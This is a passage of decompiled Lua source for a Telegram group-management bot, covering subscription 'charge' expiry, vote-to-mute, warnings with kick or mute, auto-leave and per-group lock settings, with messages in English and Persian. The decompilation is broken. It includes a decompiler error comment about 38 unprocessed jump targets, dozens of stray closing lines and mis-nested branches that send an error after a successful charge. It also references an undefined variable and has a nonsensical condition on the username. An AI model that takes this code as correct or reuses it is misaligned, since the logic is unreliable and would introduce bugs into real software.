                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "Please Enter a Number Smaller Than `1000`", 1, "md")
                                                                                          end
                                                                                          if matches[1] == "+" and ((matches[2]):lower() == "charge" or matches[2] == "شارژ") and tonumber(matches[3]) >= 0 then
                                                                                            _ENV.BotGroups = redis:smembers("BotGroups")
                                                                                            _ENV.NumberOFBotGroups = redis:scard("BotGroups")
                                                                                            if #_ENV.BotGroups == 0 then
                                                                                              if not lang then
                                                                                                return "*Bot Group List is Empty!*"
                                                                                              else
                                                                                                return "لیست گروه ربات خالی است!"
                                                                                              end
                                                                                            end
                                                                                            if not lang then
                                                                                              _ENV.txt = "`" .. matches[3] .. "` *Days Charge Were Added For* `" .. _ENV.NumberOFBotGroups .. "` *Groups*"
                                                                                            else
                                                                                              _ENV.txt = "`" .. matches[3] .. "` روز شارژ به `" .. _ENV.NumberOFBotGroups .. "` تا گروه اضافه شد"
                                                                                            end
                                                                                            ;
                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 0, _ENV.txt, 0, "md")
                                                                                            for k,v in (_ENV.pairs)(_ENV.BotGroups) do
                                                                                              _ENV.GroupExpire = tonumber(redis:ttl("ExpireDate:" .. v)) or "err"
                                                                                              if _ENV.GroupExpire ~= "err" then
                                                                                                _ENV.GroupDays = ((_ENV.math).ceil)(_ENV.GroupExpire / 86400)
                                                                                                _ENV.InputTime = tonumber(_ENV.GroupDays) + tonumber(matches[3])
                                                                                                _ENV.GroupTime = tonumber(_ENV.InputTime) * 86400
                                                                                                redis:setex("ExpireDate:" .. v, _ENV.GroupTime, true)
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                          do
                                                                                            if matches[1] == "-" and ((matches[2]):lower() == "charge" or matches[2] == "شارژ") and tonumber(matches[3]) >= 0 then
                                                                                              _ENV.BotGroups = redis:smembers("BotGroups")
                                                                                              _ENV.NumberOFBotGroups = redis:scard("BotGroups")
                                                                                              if #_ENV.BotGroups == 0 then
                                                                                                if not lang then
                                                                                                  return "*Bot Group List is Empty!*"
                                                                                                else
                                                                                                  return "لیست گروه ربات خالی است!"
                                                                                                end
                                                                                              end
                                                                                              if not lang then
                                                                                                _ENV.txt = "`" .. matches[3] .. "` *Days Charge Were Reduced From* `" .. _ENV.NumberOFBotGroups .. "` *Groups*"
                                                                                              else
                                                                                                _ENV.txt = "`" .. matches[3] .. "` روز شارژ از `" .. _ENV.NumberOFBotGroups .. "` تا گروه کاهش یافت"
                                                                                              end
                                                                                              ;
                                                                                              (tdcli.sendMessage)((msg.to).id, msg.id_, 0, _ENV.txt, 0, "md")
                                                                                              for k,v in (_ENV.pairs)(_ENV.BotGroups) do
                                                                                                _ENV.GroupExpire = tonumber(redis:ttl("ExpireDate:" .. v)) or "err"
                                                                                                if _ENV.GroupExpire ~= "err" then
                                                                                                  _ENV.GroupDays = ((_ENV.math).ceil)(_ENV.GroupExpire / 86400)
                                                                                                  _ENV.InputTime = tonumber(_ENV.GroupDays) - tonumber(matches[3])
                                                                                                  if _ENV.InputTime >= 0 then
                                                                                                    _ENV.GroupTime = tonumber(_ENV.InputTime) * 86400
                                                                                                    redis:setex("ExpireDate:" .. v, _ENV.GroupTime, true)
                                                                                                  end
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                            do
                                                                                              if (msg.to).type == "channel" or (msg.to).type == "chat" then
                                                                                                if (matches[1] == "charge" or matches[1] == "شارژ") and matches[2] and not matches[3] and is_sudo(msg) then
                                                                                                  if tonumber(matches[2]) > 0 and tonumber(matches[2]) < 1001 then
                                                                                                    local extime = tonumber(matches[2]) * 86400
                                                                                                    redis:setex("ExpireDate:" .. (msg.to).id, extime, true)
                                                                                                    if not redis:get("CheckExpire::" .. (msg.to).id) then
                                                                                                      redis:set("CheckExpire::" .. (msg.to).id, true)
                                                                                                    end
                                                                                                    if lang then
                                                                                                      (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "*تنظیم ربات با موفقیت انجام شد*\n*مدت فعال بودن ربات در گروه تغییر کرد به:* `" .. matches[2] .. "` *روز*", 1, "md")
                                                                                                      for v,owner in (_ENV.pairs)((_ENV._config).bot_owner) do
                                                                                                        local SUDO = tonumber(owner)
                                                                                                        if is_botOwner(msg) then
                                                                                                          (tdcli.sendMessage)(SUDO, 0, 1, "ربات در گروه `" .. (msg.to).id .. "` برای `" .. matches[2] .. "` روز توسط شما شارژ شد", 1, "md")
                                                                                                        else
                                                                                                          if (msg.from).username then
                                                                                                            UserName = "@" .. (msg.from).username
                                                                                                          else
                                                                                                            UserName = (msg.from).first_name
                                                                                                          end
                                                                                                          ;
                                                                                                          (tdcli.sendMessage)(SUDO, 0, 1, "ربات در گروه `" .. (msg.to).id .. "` برای `" .. matches[2] .. "` روز توسط " .. username .. " [`" .. (msg.from).id .. "`] شارژ شد", 1, "md")
                                                                                                        end
                                                                                                      end
                                                                                                    else
                                                                                                      do
                                                                                                        ;
                                                                                                        (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "*Bot set successfully\nBots activated time in group has been changed to:* `" .. matches[2] .. "` *day*", 1, "md")
                                                                                                        for v,owner in (_ENV.pairs)((_ENV._config).bot_owner) do
                                                                                                          local SUDO = tonumber(owner)
                                                                                                          if is_botOwner(msg) then
                                                                                                            (tdcli.sendMessage)(SUDO, 0, 1, "ربات در گروه `" .. (msg.to).id .. "` برای `" .. matches[2] .. "` روز توسط شما شارژ شد", 1, "md")
                                                                                                          else
                                                                                                            if (msg.from).username then
                                                                                                              UserName = "@" .. (msg.from).username
                                                                                                            else
                                                                                                              UserName = (msg.from).first_name
                                                                                                            end
                                                                                                            ;
                                                                                                            (tdcli.sendMessage)(SUDO, 0, 1, "ربات در گروه `" .. (msg.to).id .. "` برای `" .. matches[2] .. "` روز توسط " .. username .. " [`" .. (msg.from).id .. "`] شارژ شد", 1, "md")
                                                                                                          end
                                                                                                        end
                                                                                                        do
                                                                                                          if lang then
                                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "لطفا عددی کمتر از `1000` وارد کنید", 1, "md")
                                                                                                          else
                                                                                                            ;
                                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "Please Enter a Number Smaller Than `1000`", 1, "md")
                                                                                                          end
                                                                                                          if ((matches[1]):lower() == "check" or matches[1] == "چک کردن") and is_mod(msg) and not matches[2] then
                                                                                                            local expi = redis:ttl("ExpireDate:" .. (msg.to).id)
                                                                                                            local day = ((_ENV.math).floor)(expi / 86400) + 1
                                                                                                            if lang then
                                                                                                              (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "`" .. day .. "` *روز تا اتمام شارژ باقی مانده است*", 1, "md")
                                                                                                            else
                                                                                                              ;
                                                                                                              (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "`" .. day .. "` *Day to finish charge*", 1, "md")
                                                                                                            end
                                                                                                          end
                                                                                                          do
                                                                                                            if (matches[1] == "check" or matches[1] == "چک کردن") and is_mod(msg) and matches[2] and (string.match)(matches[2], "^-%d+$") then
                                                                                                              local expi = redis:ttl("ExpireDate:" .. matches[2])
                                                                                                              local day = ((_ENV.math).floor)(expi / 86400) + 1
                                                                                                              if lang then
                                                                                                                (tdcli.sendMessage)((msg.to).id, msg.id_, 1, day .. " روز تا اتما شارژ گروه باقی مانده است.", 1, "md")
                                                                                                              else
                                                                                                                ;
                                                                                                                (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "`" .. day .. "` *Day(s) remaining until Expire.*", 1, "md")
                                                                                                              end
                                                                                                            end
                                                                                                            do
                                                                                                              do
                                                                                                                if (matches[1] == "creategroup" or matches[1] == "ساخت گروه") and is_sudo(msg) then
                                                                                                                  local text = matches[2]
                                                                                                                  ;
                                                                                                                  (tdcli.createNewChannelChat)(text, 1, "", _ENV.dl_cb, nil)
                                                                                                                  if not lang then
                                                                                                                    return "*SuperGroup Has Been Created!*"
                                                                                                                  else
                                                                                                                    return "سوپر گروه ساخته شد!"
                                                                                                                  end
                                                                                                                end
                                                                                                                do
                                                                                                                  do
                                                                                                                    if (matches[1] == "tosuper" or matches[1] == "تبدیل به ابرگروه") and is_owner(msg) then
                                                                                                                      local id = (msg.to).id
                                                                                                                      ;
                                                                                                                      (tdcli.migrateGroupChatToChannelChat)(id, _ENV.dl_cb, nil)
                                                                                                                    end
                                                                                                                    if (matches[1] == "sudolist" or matches[1] == "لیست سودو") and is_sudo(msg) then
                                                                                                                      return sudolist(msg)
                                                                                                                    end
                                                                                                                    if (matches[1] == "chats" or matches[1] == "چت ها") and is_sudo(msg) then
                                                                                                                      return chat_list(msg)
                                                                                                                    end
                                                                                                                    if ((matches[1]):lower() == "join" or matches[1] == "جوین") and is_sudo(msg) and matches[2] then
                                                                                                                      (tdcli.sendMessage)((msg.to).id, msg.id, 1, "شما دعوت شدید به: " .. matches[2], 1)
                                                                                                                      ;
                                                                                                                      (tdcli.addChatMember)(matches[2], (msg.from).id, 0, _ENV.dl_cb, nil)
                                                                                                                    end
                                                                                                                    if (matches[1] == "leave" or matches[1] == "ترک گروه") and is_sudo(msg) then
                                                                                                                      (tdcli.changeChatMemberStatus)((msg.to).id, _ENV.our_id, "Left", _ENV.dl_cb, nil)
                                                                                                                    end
                                                                                                                    do
                                                                                                                      if (matches[1] == "autoleave" or matches[1] == "ترک خودکار") and is_sudo(msg) then
                                                                                                                        local hash = "auto_leave_bot"
                                                                                                                        if matches[2] == "enable" or matches[2] == "فعال" then
                                                                                                                          redis:del(hash)
                                                                                                                          return "ترک خودکار گروه فعال شد"
                                                                                                                        else
                                                                                                                          if matches[2] == "disable" or matches[2] == "غیرفعال" then
                                                                                                                            redis:set(hash, true)
                                                                                                                            return "ترک خودکار گروه غیرفعال شد"
                                                                                                                          else
                                                                                                                            if matches[2] == "status" or matches[2] == "وضعیت" then
                                                                                                                              if not redis:get(hash) then
                                                                                                                                return "فعال می باشد"
                                                                                                                              else
                                                                                                                                return "غیرفعال می باشد"
                                                                                                                              end
                                                                                                                            end
                                                                                                                          end
                                                                                                                        end
                                                                                                                      end
                                                                                                                      _ENV.mmber = function(extra, result, success)
    -- function num : 0_56_28 , upvalues : _ENV
    number = result.member_count_
  end

                                                                                                                      if matches[1] == "votemute" or matches[1] == "رای میوت" then
                                                                                                                        (tdcli.getChannelFull)((msg.to).id, _ENV.mmber)
                                                                                                                        _ENV.is_sabt = redis:ttl("sabt:" .. (msg.from).id .. ":" .. (msg.to).id) > 1
                                                                                                                        if _ENV.is_sabt then
                                                                                                                          if not lang then
                                                                                                                            return "*You can vote only once for 30 min*"
                                                                                                                          else
                                                                                                                            return "شما فقط یکبار برای 30 دقیقه میتوانید رای بدهید"
                                                                                                                          end
                                                                                                                        else
                                                                                                                          user = matches[2]
                                                                                                                          chat = (msg.to).id
                                                                                                                          _ENV.expire = 1800
                                                                                                                          hash = "votemute:" .. user .. "from:" .. chat
                                                                                                                          _ENV.members = tonumber(_ENV.number)
                                                                                                                          if not _ENV.members then
                                                                                                                            return "Error!"
                                                                                                                          elseif _ENV.members < 10 then
                                                                                                                            if not lang then
                                                                                                                              return "*Minimum members for vote is* `10` *members now is:* `" .. _ENV.number .. "`"
                                                                                                                            else
                                                                                                                              return "حداقل تعداد اعضا برای رای گیری `10` *می باشد تعداد اعضا در حال حاضر:* `" .. _ENV.number .. "`"
                                                                                                                            end
                                                                                                                          end
                                                                                                                          if (_ENV.is_silent_user)(user, chat) then
                                                                                                                            if not lang then
                                                                                                                              return "*User* `" .. user .. "` *is already muted!*"
                                                                                                                            else
                                                                                                                              return "کاربر `" .. user .. "` از قبل میوت است!"
                                                                                                                            end
                                                                                                                          elseif not redis:get(hash) then
                                                                                                                            redis:set(hash, "1")
                                                                                                                            redis:setex("sabt:" .. (msg.from).id .. ":" .. (msg.to).id, _ENV.expire, true)
                                                                                                                            if not lang then
                                                                                                                              return "*[1/10] Voted for mute user *`" .. user .. "`"
                                                                                                                            else
                                                                                                                              return "*[1/10]* رای داده شد برای میوت کاربر `" .. user .. "`"
                                                                                                                            end
                                                                                                                          elseif redis:get(hash) then
                                                                                                                            if _ENV.members < 50 then
                                                                                                                              _ENV.votes = 5
                                                                                                                            elseif 50 < _ENV.members and _ENV.members < 100 then
                                                                                                                              _ENV.votes = 10
                                                                                                                            elseif _ENV.members > 100 and _ENV.members < 500 then
                                                                                                                              _ENV.votes = 15
                                                                                                                            elseif 500 < _ENV.members and _ENV.members < 1000 then
                                                                                                                              _ENV.votes = 20
                                                                                                                            elseif 1000 < _ENV.members then
                                                                                                                              _ENV.votes = 25
                                                                                                                            end
                                                                                                                            _ENV.now = redis:get(hash) + 1
                                                                                                                            _ENV.last = redis:get(hash) - 1
                                                                                                                            _ENV.fixed = redis:get(hash) + 0
                                                                                                                            if _ENV.votes == _ENV.now and _ENV.votes - 1 == _ENV.fixed then
                                                                                                                              redis:del(hash)
                                                                                                                              redis:setex("sabt:" .. (msg.from).id .. ":" .. (msg.to).id, _ENV.expire, true)
                                                                                                                              redis:sadd("GroupSilentUsers:" .. (msg.to).id, user)
                                                                                                                              if not lang then
                                                                                                                                return "*[" .. _ENV.votes .. "/" .. _ENV.votes .. "] Finished! *`" .. user .. "`* has been muted by members vote*"
                                                                                                                              else
                                                                                                                                return "*[" .. _ENV.votes .. "/" .. _ENV.votes .. "]* تمام شد! `" .. user .. "` با رای اعضا میوت شد"
                                                                                                                              end
                                                                                                                            elseif _ENV.fixed < _ENV.votes and _ENV.votes - 1 ~= _ENV.fixed then
                                                                                                                              redis:set(hash, _ENV.now)
                                                                                                                              redis:setex("sabt:" .. (msg.from).id .. ":" .. (msg.to).id, _ENV.expire, true)
                                                                                                                              if not lang then
                                                                                                                                return "*[" .. redis:get(hash) .. "/" .. _ENV.votes .. "] Voted for mute user *`" .. user .. "`"
                                                                                                                              else
                                                                                                                                return "*[" .. redis:get(hash) .. "/" .. _ENV.votes .. "]* رای داده شد برای میوت کاربر `" .. user .. "`"
                                                                                                                              end
                                                                                                                            end
                                                                                                                          end
                                                                                                                        end
                                                                                                                      end
                                                                                                                      if (matches[1] == "delmute" or matches[1] == "حذف میوت") and is_mod(msg) then
                                                                                                                        hash = "votemute:" .. tonumber(matches[2]) .. "from:" .. (msg.to).id
                                                                                                                        if redis:get(hash) then
                                                                                                                          redis:del(hash)
                                                                                                                          if not lang then
                                                                                                                            return "*Votemute of* [`" .. matches[2] .. "`] *has been cleaned!*"
                                                                                                                          else
                                                                                                                            return "رای گیری برای میوت [`" .. matches[2] .. "`] پاکسازی شد!"
                                                                                                                          end
                                                                                                                        elseif not lang then
                                                                                                                          return "*User* [`" .. matches[2] .. "`] *has not votemute!*"
                                                                                                                        else
                                                                                                                          return "*کاربر* [`" .. matches[2] .. "`] *رای گیری میوت ندارد!*"
                                                                                                                        end
                                                                                                                      end
                                                                                                                      if ((matches[1]):lower() == "warn" or matches[1] == "اخطار") and is_mod(msg) then
                                                                                                                        _ENV.hash2 = "gp_lang:" .. (msg.to).id
                                                                                                                        lang = redis:get(_ENV.hash2)
                                                                                                                        _ENV.warn = function(extra, result, success)
    -- function num : 0_56_29 , upvalues : user, chat, hash, _ENV, lang, msg, matches
    user = result.sender_user_id_
    chat = result.chat_id_
    hash = "warn:" .. user .. ":From:" .. result.chat_id_
    MaxWarn = redis:hget("GroupSettings:" .. result.chat_id_, "MaxWarn") or 5
    if isModerator(chat, user) then
      return NoAccess(chat)
    else
      if not redis:get(hash) then
        redis:set(hash, 1)
        if not lang then
          text = "[`1`/`" .. MaxWarn .. "`] *Admin* " .. (msg.from).first_name .. " *give warn to* `" .. user .. "`\n*Reason:* " .. matches[2]
          ;
          (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, text, 0, "md")
        else
          text = "[`1`/`" .. MaxWarn .. "`] ادمین " .. (msg.from).first_name .. " یک اخطار داد به `" .. user .. "`\nدلیل: " .. matches[2]
          ;
          (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, text, 0, "md")
        end
      else
        after = tonumber(redis:get(hash)) + 1
        if after == tonumber(MaxWarn) then
          redis:del(hash)
          if not lang then
            text = "[`" .. after .. "`/`" .. MaxWarn .. "`] [`Finish`] *Admin* " .. (msg.from).first_name .. " *give warn to* `" .. user .. "`\n*Reason:* " .. matches[2]
            ;
            (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, text, 0, "md")
          else
            text = "[`" .. after .. "`/`" .. MaxWarn .. "`] [`تمام`] ادمین " .. (msg.from).first_name .. " یک اخطار داد به `" .. user .. "`\nدلیل: " .. matches[2]
            ;
            (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, text, 0, "md")
          end
          if not redis:get("WarnStatus:" .. result.chat_id_) then
            kick_user(user, chat)
            if not lang then
              (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "*User* `" .. user .. "` *has been kicked for complete warnings*", 0, "md")
            else
              ;
              (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "شخص `" .. user .. "` برای تکمیل اخطار ها اخراج شد", 0, "md")
            end
          else
            if redis:get("WarnStatus:" .. result.chat_id_) == "kick" then
              kick_user(user, chat)
              if not lang then
                (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "*User* `" .. user .. "` *has been kicked for complete warnings*", 0, "md")
              else
                ;
                (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "شخص `" .. user .. "` برای تکمیل اخطار ها اخراج شد", 0, "md")
              end
            else
              if redis:get("WarnStatus:" .. result.chat_id_) == "mute" then
                redis:sadd("GroupSilentUsers:" .. result.chat_id_, user)
                if not lang then
                  (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "*User* `" .. user .. "` *has been added to silent list for complete warnings*", 0, "md")
                else
                  ;
                  (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "شخص `" .. user .. "` برای تکمیل اخطار ها به لیست افراد ساکت اضافه شد", 0, "md")
                end
              end
            end
          end
        else
          if after < tonumber(MaxWarn) then
            redis:set(hash, after)
            if not lang then
              text = "[`" .. after .. "`/`" .. MaxWarn .. "`] *Admin* " .. (msg.from).first_name .. " *give warn to* `" .. user .. "`\n*Reason:* " .. matches[2]
              ;
              (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, text, 0, "md")
            else
              text = "[`" .. after .. "`/`" .. MaxWarn .. "`] ادمین " .. (msg.from).first_name .. " یک اخطار داد به `" .. user .. "`\nدلیل: " .. matches[2]
              ;
              (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, text, 0, "md")
            end
          end
        end
      end
    end
  end

                                                                                                                        tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.warn, nil)
                                                                                                                      end
                                                                                                                      if ((matches[1]):lower() == "delwarn" or (matches[1]):lower() == "cleanwarn" or matches[1] == "حذف اخطار") and is_mod(msg) then
                                                                                                                        if matches[2] and not msg.reply_id then
                                                                                                                          user = matches[2]
                                                                                                                          hash = "warn:" .. user .. ":From:" .. (msg.to).id
                                                                                                                          if (_ENV.isModerator)((msg.to).id, user) then
                                                                                                                            return (_ENV.NoAccess)((msg.to).id)
                                                                                                                          elseif redis:get(hash) then
                                                                                                                            redis:del(hash)
                                                                                                                            return (_ENV.SendStatus)((msg.to).id, user, "Warns Cleaned", "اخطار ها پاک شدند")
                                                                                                                          else
                                                                                                                            return (_ENV.SendStatus)((msg.to).id, user, "No Warns", "اخطاری ندارد")
                                                                                                                          end
                                                                                                                        elseif not matches[2] and msg.reply_id then
                                                                                                                          _ENV.delwarn = function(extra, result, success)
    -- function num : 0_56_30 , upvalues : user, hash, msg, _ENV
    user = result.sender_user_id_
    hash = "warn:" .. user .. ":From:" .. (msg.to).id
    if isModerator((msg.to).id, user) then
      return NoAccess((msg.to).id)
    else
      if redis:get(hash) then
        redis:del(hash)
        return SendStatus((msg.to).id, user, "Warns Cleaned", "اخطار ها پاک شدند")
      else
        return SendStatus((msg.to).id, user, "No Warns", "اخطاری ندارد")
      end
    end
  end

                                                                                                                          tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.delwarn, nil)
                                                                                                                        end
                                                                                                                      end
                                                                                                                      if ((matches[1]):lower() == "warnstatus" or matches[1] == "وضعیت اخطار") and is_owner(msg) then
                                                                                                                        hash = "WarnStatus:" .. (msg.to).id
                                                                                                                        if matches[2] == "kick" or matches[2] == "اخراج" then
                                                                                                                          redis:set(hash, "kick")
                                                                                                                          if not lang then
                                                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 0, "*Warn status has been changed to* `kick`", 0, "md")
                                                                                                                          else
                                                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 0, "*وضعیت اخطار با موفقیت تغییر کرد به* `اخراج`", 0, "md")
                                                                                                                          end
                                                                                                                        elseif matches[2] == "silent" or matches[2] == "سکوت" then
                                                                                                                          redis:set(hash, "mute")
                                                                                                                          if not lang then
                                                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 0, "*Warn status has been changed to* `mute`", 0, "md")
                                                                                                                          else
                                                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 0, "*وضعیت اخطار با موفقیت تغییر کرد به* `میوت`", 0, "md")
                                                                                                                          end
                                                                                                                        end
                                                                                                                      end
                                                                                                                    end
                                                                                                                    -- DECOMPILER ERROR: 38 unprocessed JMP targets
                                                                                                                  end
                                                                                                                end
                                                                                                              end
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                      end
                                                                                                    end
                                                                                                  end
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                              end
                                                                            end
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                          end
                                        end
                                      end
                                    end
                                  end
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

local pre_process = function(msg)
  -- function num : 0_57 , upvalues : _ENV, Slen, run_bash, getChatId, Mojavez_A_Plus, botrem
  if not redis:sismember("FixCleanMSG:" .. (msg.to).id, (msg.from).id) then
    redis:sadd("FixCleanMSG:" .. (msg.to).id, (msg.from).id)
  end
  local chat = msg.chat_id_
  local user = (msg.from).id
  local is_channel = (msg.to).type == "channel"
  local is_chat = (msg.to).type == "chat"
  local auto_leave = "auto_leave_bot"
  local data = load_data("./data/moderation.json")
  local hash = "gp_lang:" .. chat
  local lang = redis:get(hash)
  local sense = redis:get("sense:" .. chat)
  if is_channel then
    if not data[tostring((msg.to).id)] and not redis:get(auto_leave) and not is_sudo(msg) and not is_botOwner(msg) then
      (tdcli.sendMessage)(msg.chat_id_, 0, 0, "`این گروه نصب نشده است!`", 0, "md")
      do
        for v,owner in pairs(_config.bot_owner) do
          (tdcli.sendMessage)(owner, 0, 0, "ربات به گروه " .. (msg.to).id .. " با نام " .. check_markdown((msg.to).title) .. " به صورت غیرمجاز اضافه شده بود", 0)
        end
      end
      ;
      (tdcli.changeChatMemberStatus)(chat, our_id, "Left", dl_cb, nil)
    end
    local target = msg.chat_id_
    local mute_all = "no"
    local mute_gif = "no"
    local mute_text = "no"
    local mute_photo = "no"
    local mute_video = "no"
    local mute_audio = "no"
    local mute_voice = "no"
    local mute_sticker = "no"
    local mute_contact = "no"
    local mute_forward = "no"
    local mute_location = "no"
    local mute_document = "no"
    local mute_tgservice = "no"
    local mute_inline = "no"
    local mute_game = "no"
    local mute_keyboard = "no"
    local lock_link = "no"
    local lock_tag = "no"
    local lock_mention = "no"
    local lock_arabic = "no"
    local lock_edit = "no"
    local lock_spam = "no"
    local lock_flood = "no"
    local lock_bots = "no"
    local lock_markdown = "no"
    local lock_webpage = "no"
    local lock_pin = "no"
    local lock_MaxWords = "no"
    local lock_fohsh = "no"
    local lock_english = "no"
    local lock_forcedinvite = "no"
    local lock_username = redis:hget("GroupSettings:" .. target, "lock_username") or "no"
    local lock_join = redis:hget("GroupSettings:" .. target, "lock_join") or "no"
    local lock_withcaption = redis:hget("GroupSettings:" .. target, "lock_withcaption") or "no"
    local lock_nocaption = redis:hget("GroupSettings:" .. target, "lock_nocaption") or "no"
    if redis:hget("GroupSettings:" .. target, "mute_all") == "yes" then
      mute_all = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_gif") == "yes" then
      mute_gif = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_text") == "yes" then
      mute_text = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_photo") == "yes" then
      mute_photo = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_video") == "yes" then
      mute_video = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_audio") == "yes" then
      mute_audio = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_voice") == "yes" then
      mute_voice = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_sticker") == "yes" then
      mute_sticker = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_contact") == "yes" then
      mute_contact = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_forward") == "yes" then
      mute_forward = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_location") == "yes" then
      mute_location = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_document") == "yes" then
      mute_document = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_tgservice") == "yes" then
      mute_tgservice = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_inline") == "yes" then
      mute_inline = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_game") == "yes" then
      mute_game = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "mute_keyboard") == "yes" then
      mute_keyboard = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "num_msg_max") then
      NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. target, "num_msg_max"))
    else
      NUM_MSG_MAX = 5
    end
    if redis:hget("GroupSettings:" .. target, "MaxWords") then
      MaxWords = tonumber(redis:hget("GroupSettings:" .. target, "MaxWords"))
    else
      MaxWords = 50
    end
    if redis:hget("GroupSettings:" .. target, "MaxWarn") then
      MaxWarn = tonumber(redis:hget("GroupSettings:" .. target, "MaxWarn"))
    else
      MaxWarn = 5
    end
    if redis:hget("GroupSettings:" .. target, "FloodTime") then
      FloodTime = tonumber(redis:hget("GroupSettings:" .. target, "FloodTime"))
    else
      FloodTime = 30
    end
    if redis:hget("GroupSettings:" .. target, "ForcedInvite") then
      ForcedInvite = tonumber(redis:hget("GroupSettings:" .. target, "ForcedInvite"))
    else
      ForcedInvite = 2
    end
    if redis:hget("GroupSettings:" .. target, "lock_link") == "yes" then
      lock_link = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_tag") == "yes" then
      lock_tag = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_mention") == "yes" then
      lock_mention = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_arabic") == "yes" then
      lock_arabic = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_edit") == "yes" then
      lock_edit = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_spam") == "yes" then
      lock_spam = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "flood") == "yes" then
      lock_flood = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_bots") == "yes" then
      lock_bots = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_markdown") == "yes" then
      lock_markdown = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_webpage") == "yes" then
      lock_webpage = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_pin") == "yes" then
      lock_pin = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_MaxWords") == "yes" then
      lock_MaxWords = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_fohsh") == "yes" then
      lock_fohsh = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_english") == "yes" then
      lock_english = "yes"
    end
    if redis:hget("GroupSettings:" .. target, "lock_forcedinvite") == "yes" then
      lock_forcedinvite = "yes"
    end
    if (msg.adduser or (msg.content_).ID == "MessageChatJoinByLink" or (msg.content_).ID == "MessageChatDeleteMember") and mute_tgservice == "yes" then
      del_msg(chat, tonumber(msg.id))
    end
    if (msg.content_).ID == "MessagePinMessage" and is_channel and lock_pin == "yes" then
      if is_owner(msg) then
        return 
      end
      if tonumber((msg.from).id) == our_id then
        return 
      end
      local pin_msg = (data[tostring(chat)]).pin
      if pin_msg then
        (tdcli.pinChannelMessage)(msg.chat_id_, pin_msg, 1)
      elseif not pin_msg then
        (tdcli.unpinChannelMessage)(msg.chat_id_)
      end
      if not "@" .. (msg.from).username then
        (tdcli.sendMessage)(msg.chat_id_, msg.id, 0, "<b>User ID :</b> <code>" .. (msg.from).id .. "</code>\n<b>Username :</b> " .. (not lang or "<code>No Username</code>") .. "\n<code>شما اجازه دسترسی به سنجاق پیام را ندارید، به همین دلیل پیام قبلی مجدد سنجاق میگردد</code>", 0, "html")
        if not "@" .. (msg.from).username then
          do
            (tdcli.sendMessage)(msg.chat_id_, msg.id, 0, "<b>User ID :</b> <code>" .. (msg.from).id .. "</code>\n<b>Username :</b> " .. (lang or "<code>No Username</code>") .. "\n<code>You Have Not Permission To Pin Message, Last Message Has Been Pinned Again</code>", 0, "html")
            if not is_mod(msg) and not redis:get("AllowUser~" .. user .. "~From~" .. chat) then
              check_newmember = function(arg, data)
    -- function num : 0_57_0 , upvalues : lock_bots, _ENV, lang, lock_join, lock_forcedinvite, msg, Slen
